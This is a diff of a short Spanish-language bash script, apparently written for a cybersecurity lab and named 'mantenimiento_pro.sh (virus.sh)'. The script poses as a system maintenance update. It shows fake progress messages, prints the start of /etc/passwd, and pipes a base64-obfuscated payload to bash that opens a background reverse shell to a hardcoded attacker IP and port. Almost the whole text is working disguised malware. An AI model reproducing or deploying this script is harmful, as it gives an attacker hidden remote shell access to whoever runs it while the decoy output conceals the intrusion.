@@ -1,14 +1,22 @@
 #!/bin/bash
-# AQUÍ ESTÁ EL TRUCO: Pon tu IP de atacante fija
+
+# ========================================================
+# Script: mantenimiento_pro.sh (virus.sh)
+# Uso: Laboratorio de Ciberseguridad
+# ========================================================
+
+# Configuración del atacante
 IP_ATACANTE="192.168.1.109"
 PUERTO=4444
 
 echo "Iniciando mantenimiento del sistema..."
+# Simulamos actividad legítima leyendo parte del archivo passwd
 cat /etc/passwd | head -n 5
-echo "Procesando paquetes..."
+echo "Procesando paquetes y verificando dependencias..."
 
-# Ejecutamos la reverse shell hacia TU IP (192.168.1.109)
-echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8kMS80NDQ0IDA+JjEgJm==" | base64 -d | bash
+# CARGA ÚTIL (PAYLOAD) OFUSCADA
+# Decodifica y ejecuta una reverse shell en segundo plano
+echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTA5LzQ0NDQgMD4mMSAm" | base64 -d | bash
 
 sleep 2
-echo "Actualización completada."
+echo "Actualización completada correctamente."
